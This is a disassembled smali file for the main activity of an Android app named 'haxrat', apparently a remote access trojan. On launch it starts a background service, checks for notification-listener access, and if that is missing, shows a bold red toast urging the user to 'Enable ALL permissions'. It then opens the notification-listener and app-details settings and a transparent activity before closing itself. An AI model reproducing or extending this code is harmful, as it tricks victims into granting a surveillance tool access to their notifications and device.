.class public Lcom/hax4us/haxrat/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 74
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private isNotificationServiceRunning()Z
    .locals 8

    .prologue
    .line 69
    move-object v0, p0

    move-object v6, v0

    invoke-virtual {v6}, Lcom/hax4us/haxrat/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    move-object v2, v6

    .line 70
    move-object v6, v2

    const-string v7, "enabled_notification_listeners"

    invoke-static {v6, v7}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    move-object v3, v6

    .line 72
    move-object v6, v0

    invoke-virtual {v6}, Lcom/hax4us/haxrat/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v6

    move-object v4, v6

    .line 73
    move-object v6, v3

    if-eqz v6, :cond_0

    move-object v6, v3

    move-object v7, v4

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_1

    :cond_0
    const/4 v6, 0x0

    :goto_0
    move v0, v6

    return v0

    :cond_1
    const/4 v6, 0x1

    goto :goto_0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 21
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object v13, v0

    const-string v14, "com.aide.ui"

    invoke-static {v13, v14}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 22
    move-object v13, v0

    move-object v14, v1

    invoke-super {v13, v14}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 24
    move-object v13, v0

    const/high16 v14, 0x7f030000

    invoke-virtual {v13, v14}, Lcom/hax4us/haxrat/MainActivity;->setContentView(I)V

    .line 26
    move-object v13, v0

    invoke-static {v13}, Lcom/hax4us/haxrat/MainService;->startService(Landroid/content/Context;)V

    .line 27
    const-string v13, "TAGG"

    const-string v14, "MAINACTIVITY"

    invoke-static {v13, v14}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v13

    .line 28
    move-object v13, v0

    invoke-direct {v13}, Lcom/hax4us/haxrat/MainActivity;->isNotificationServiceRunning()Z

    move-result v13

    move v3, v13

    .line 29
    move v13, v3

    if-nez v13, :cond_0

    .line 31
    move-object v13, v0

    invoke-virtual {v13}, Lcom/hax4us/haxrat/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v13

    move-object v4, v13

    .line 32
    const-string v13, "Click \'Permissions\'\nEnable ALL permissions\n Click back \nother permissions > Display pop-up windows while running in the background\n click back x2\nEnable \'Package Manager\'"

    move-object v5, v13

    .line 33
    const/4 v13, 0x1

    move v6, v13

    .line 35
    move-object v13, v4

    move-object v14, v5

    move v15, v6

    invoke-static {v13, v14, v15}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v13

    move-object v7, v13

    .line 37
    move-object v13, v7

    invoke-virtual {v13}, Landroid/widget/Toast;->getView()Landroid/view/View;

    move-result-object v13

    const v14, 0x102000b

    invoke-virtual {v13, v14}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v13

    check-cast v13, Landroid/widget/TextView;

    move-object v8, v13

    .line 38
    move-object v13, v8

    const/high16 v14, -0x10000

    invoke-virtual {v13, v14}, Landroid/widget/TextView;->setTextColor(I)V

    .line 39
    move-object v13, v8

    sget-object v14, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v13, v14}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 40
    move-object v13, v8

    const/16 v14, 0x11

    invoke-virtual {v13, v14}, Landroid/widget/TextView;->setGravity(I)V

    .line 41
    move-object v13, v7

    invoke-virtual {v13}, Landroid/widget/Toast;->show()V

    .line 44
    move-object v13, v0

    new-instance v14, Landroid/content/Intent;

    move-object/from16 v20, v14

    move-object/from16 v14, v20

    move-object/from16 v15, v20

    const-string v16, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct/range {v15 .. v16}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v14}, Lcom/hax4us/haxrat/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 45
    new-instance v13, Landroid/content/Intent;

    move-object/from16 v20, v13

    move-object/from16 v13, v20

    move-object/from16 v14, v20

    move-object v15, v0

    :try_start_0
    const-string v16, "com.hax4us.haxrat.TransparentActivity"

    invoke-static/range {v16 .. v16}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v16

    invoke-direct/range {v14 .. v16}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v9, v13

    .line 46
    move-object v13, v9

    const-string v14, "FIRSTTIME"

    const/4 v15, 0x1

    invoke-virtual {v13, v14, v15}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    move-result-object v13

    .line 47
    move-object v13, v0

    move-object v14, v9

    invoke-virtual {v13, v14}, Lcom/hax4us/haxrat/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 59
    new-instance v13, Landroid/content/Intent;

    move-object/from16 v20, v13

    move-object/from16 v13, v20

    move-object/from16 v14, v20

    const-string v15, "android.settings.APPLICATION_DETAILS_SETTINGS"

    new-instance v16, Ljava/lang/StringBuffer;

    move-object/from16 v20, v16

    move-object/from16 v16, v20

    move-object/from16 v17, v20

    invoke-direct/range {v17 .. v17}, Ljava/lang/StringBuffer;-><init>()V

    const-string v17, "package:"

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v16

    move-object/from16 v17, v4

    invoke-virtual/range {v17 .. v17}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v17

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v16

    invoke-static/range {v16 .. v16}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v16

    invoke-direct/range {v14 .. v16}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    move-object v11, v13

    .line 60
    move-object v13, v0

    move-object v14, v11

    invoke-virtual {v13, v14}, Lcom/hax4us/haxrat/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 63
    :cond_0
    move-object v13, v0

    invoke-virtual {v13}, Lcom/hax4us/haxrat/MainActivity;->finish()V

    return-void

    .line 45
    :catch_0
    move-exception v13

    move-object v10, v13

    new-instance v13, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v20, v13

    move-object/from16 v13, v20

    move-object/from16 v14, v20

    move-object v15, v10

    invoke-virtual {v15}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v13
.end method
